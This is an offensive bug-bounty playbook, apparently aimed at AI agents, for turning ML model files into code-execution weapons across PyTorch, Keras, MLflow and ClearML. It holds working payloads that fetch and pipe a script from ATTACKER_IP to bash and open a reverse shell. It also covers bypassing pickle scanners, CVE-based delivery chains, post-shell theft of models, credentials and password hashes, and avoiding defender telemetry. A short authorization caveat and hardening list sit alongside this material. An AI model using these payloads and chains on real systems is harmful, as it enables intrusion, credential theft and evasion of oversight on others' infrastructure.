---
technology: "Weaponized ML model formats"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "corpus-grounded (model-format command-context gate, internal coverage ledger) + upstream-verified: HiddenLayer advisory set CVE-2024-24590/-24591/-24592/-24593/-24594/-24595, NVD/Snyk CVE-2024-37054 (MLflow pyfunc, affected >=0.9.0 <2.14.2), TensorFlow GHSA/NVD CVE-2022-29216 (saved_model_cli, fixed 2.6.4/2.7.2/2.8.1/2.9.0), PyTorch serialization docs (weights_only default True since 2.6), fickling severity model, 2026-11-12"
provenance: "corpus-grounded: 5 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[ml-models|weaponized model formats overview]] — why model files are code and where they get loaded. Tool notes live in the tools vault; Appendix A names tools in prose.

# ML model-format bug bounty methodology

**Scope:** the formats (PyTorch .pt/.pth, Keras .h5 / TF SavedModel, MLflow PyFunc, ClearML artifacts) and the delivery paths that load them (upload-and-predict apps, registries/MLOps platforms, privileged evaluators). **Out of scope:** generic app-level pickle endpoints that never touch a model (session stores, cache poisoning — those belong to the web-framework units), and ML *infrastructure* compromise without a format step.

**Authorization:** model-upload testing executes code on someone's inference host — treat every uploaded artifact as live; benign payloads only (`id`, a token callback), and never ship a weaponized model to a third-party SaaS without explicit permission.

## Decision tree (one screen)

1. A model file in play → Phase 1 (identify format/loader from extension and app behavior).
2. An upload-and-predict app → Phase 3 craft for that framework, Phase 4 delivery path A.
3. A ClearML / MLflow deployment found (subdomain sweep, version page) → Phase 4 paths B/C — platform CVEs first, format payload second.
4. A privileged loader (sudo/cron evaluator, possibly with a scanner) → Phase 4 path D — bypass is part of the chain.
5. A model file already in hand (breach loot, public repo) → Phase 2 static dissection before anything executes.

## Phase 1 — Identify the format and its loader

- Extension mapping: `.pth`/`.pt` → `torch.load()` (zip archive, `data.pkl` inside; older `.pt` is tar with a `pickle` member) · `.h5`/`.keras` → Keras `load_model` · directory with `saved_model.pb` → TF SavedModel tooling · MLflow runs → `pyfunc.load_model()` (cloudpickle) · ClearML artifacts → client `Artifact.get()`.
- App tells: a dashboard note or `requirements.txt` naming the framework version (one corpus app pinned `tensorflow-cpu==2.13.1` and accepted `.h5` only) — match the target's exact framework version when crafting.
- Version gates to check before choosing a CVE path: MLflow ≥0.9.0 and <2.14.2 (pyfunc deserialization); TensorFlow <2.6.4 / <2.7.2 / <2.8.1 / <2.9.0 (saved_model_cli eval path); PyTorch <2.6 (torch.load unrestricted by default).

## Phase 2 — Static dissection of a model file

```bash
unzip -l model.pth                 # zip-based checkpoint: data.pkl + tensor storage
unzip model.pth -d model/ && fickling -s --print-results model/data.pkl
# tar-based (older .pt): tar xf, then the member is literally named 'pickle'
```

Read: a benign checkpoint is still full of "inherently unsafe" calls (`_rebuild_tensor_v2`, storage updates) — that is the noise floor scanners must tolerate. Look for `eval`, `exec`, `__reduce__` results, unused globals, and any import that is not torch/stdlib.

## Phase 3 — Crafting per format

### 3a. Pickle-backed (PyTorch checkpoints, ClearML artifacts, anything pickle)

```python
import pickle, os
class RunCommand:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER_IP/rev.sh | bash',))
with open('artifact.pkl', 'wb') as f:
    pickle.dump(RunCommand(), f)
```

For .pth, inject into a real checkpoint rather than shipping a bare pickle: take the target's own demo/benign model and inject a code object (pickle_inject-style tooling does this mechanically) — the model then loads, evaluates, and reports sane accuracy around the payload.

### 3b. Bypassing pickle scanners (fickling-class gates)

- `eval`/`exec` and unused-variable assignments get flagged OVERTLY_MALICIOUS; `runpy` module execution does not — the corpus chain injected `runpy` + `import os; os.system(...)` and passed as LIKELY_UNSAFE while executing as root.
- Remember the gate only sees the extracted `data.pkl`; `.pth` must be unzipped first (a gate that forgets the tar variant is itself a finding).

### 3c. Keras .h5 (Lambda layers)

```python
import tensorflow as tf
def exploit(x):
    import os; os.system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/9090 0>&1"')
    return x
model = tf.keras.Sequential([tf.keras.layers.Input(shape=(64,)),
                             tf.keras.layers.Lambda(exploit)])
model.compile(); model.save('exploit.h5')
```

Fires when the app loads the model and runs a prediction (the "View Predictions" button class of trigger).

### 3d. MLflow PyFunc (CVE-2024-37054)

A PythonModel wrapper whose attribute (or `__reduce__` inside the pickled wrapper) executes on `pyfunc.load_model()` → `_load_pyfunc` → cloudpickle load. Affects 0.9.0 up to (not including) 2.14.2; fixed 2.14.2. Delivery: register/log the malicious model into a registry the app loads from (see 4C).

### 3e. TensorFlow tooling (CVE-2022-29216)

`saved_model_cli`'s argument parsing reached `eval` (the `safe=False` compatibility path, via `preprocess_input_exprs_arg_string`); the advisory's PoC shape is `x=exec("...")` inside an `--input_exprs`-style string. Fixed 2.6.4/2.7.2/2.8.1/2.9.0. Meet it where an app or escalation path passes user text into that parsing helper.

## Phase 4 — Delivery paths

**A. Upload-and-predict web app:** register if needed → upload crafted model (match accepted extension) → trigger prediction. Expect the app user (svc/app-class accounts); the instance SQLite (`users.db`) with app password hashes is the standard lateral step.

**B. ClearML (HiddenLayer advisory set, Feb 2024):** sweep subdomains — web app, API, fileserver on distinct hosts. No-auth web UIs exist in the wild. The canonical chain: SDK-upload a pickle artifact with `auto_pickle=False` (avoid the double-pickling that wraps your file path in another pickle), then use `tasks.add_or_update_artifacts` to set its type to `pickle`, so the victim's scheduled `Artifact.get()` runs `pickle.load()` (CVE-2024-24590); the unauthenticated fileserver read/write (CVE-2024-24592, default port 8081) is the companion primitive. Family context upstream: path traversal on dataset download (-24591), server CSRF (-24593), XSS in the web UI (-24594), plaintext credentials in the server's MongoDB (-24595).

**C. MLflow:** find the tracking/registry vhost (a canceled basic-auth prompt leaks the MLflow error page); weak/default basic auth is the usual way in. Register a malicious PyFunc model that shadows a model the web app loads at prediction time — the app's next `pyfunc.load_model()` executes the payload in the app's context (corpus-proven; CVE-2024-37054).

**D. Privileged evaluator (scanner-gated):** copy the target's config/script, retarget the model path to your crafted `.pth`, let the cron/sudo job run it. If a fickling-class gate sits in front, use 3b. The corpus job ran as root and printed command output into the evaluation log — read where output lands before choosing a payload.

## Phase 5 — Aftermath and evidence

- **Finding shape:** format + version evidence, the crafted artifact's hash, where it was delivered, the load-time trigger, and an execution artifact (`id` output, unique callback) — plus the model still evaluating, which is the impact statement ("no operator-visible failure").
- **Post-shell:** registries hold other users' models (steal IP-grade data); ClearML MongoDB held plaintext credentials upstream; MLflow servers often expose artifact stores with datasets and tokens.
- **Defender telemetry to note and avoid:** scanner logs marking artifacts LIKELY_UNSAFE (nobody reads them — that is the finding), new registered-model versions, prediction-latency blips from payload work.

## Phase 6 — Hardening for the report

- PyTorch: enforce `weights_only=True` (default since 2.6; `TORCH_FORCE_WEIGHTS_ONLY_LOAD=1` for legacy fleets) or move to tensor-only containers (safetensors-style).
- Registries/platforms: authenticate everything (ClearML fileserver included), upgrade past the advisory sets (ClearML Feb-2024 fixes; MLflow 2.14.2), sign artifacts and pin trust anchors.
- Treat "scanner passed" as a lint, not a boundary: gates grade pickle *style*, not effect — `runpy`-class indirection defeats them by design.

## Appendix A — Tooling (named in prose)

- **fickling** — static pickle analysis/crafting; `-s --print-results` / `--json-output` for gate-shaped checks; severity model LIKELY_SAFE → OVERTLY_MALICIOUS.
- **pickle_inject-style injection tooling** (HiddenLayer PoC family) — injects eval/runpy calls into existing .pth checkpoints.
- **clearml SDK + httpie/curl against the API** — artifact upload, type rewrite via `tasks.add_or_update_artifacts`, task creation with review tags.
- **mlflow client** — model registration/logging for PyFunc delivery.
- **sqlite3 / hashcat** — the standard app-instance DB and hash-cracking follow-through (modes 0/3200).
- References (upstream-verified for this page): HiddenLayer "Not So Clear" advisory series; NVD/Snyk CVE-2024-37054 and TensorFlow advisory CVE-2022-29216; PyTorch serialization security notes; fickling documentation.

## Appendix B — Quick reference

```bash
# dissect
unzip model.pth -d m && fickling -s --print-results m/data.pkl
# craft (pickle)      -> __reduce__ = (os.system, ('curl http://ATTACKER_IP/rev.sh | bash',))
# craft (keras)       -> tf.keras.layers.Lambda(exploit) ; model.save('exploit.h5')
# deliver             -> upload + trigger prediction | register PyFunc (mlflow) |
#                        clearml: upload_artifact(auto_pickle=False) + type->pickle via API
# bypass gate         -> runpy injection instead of eval/exec
```
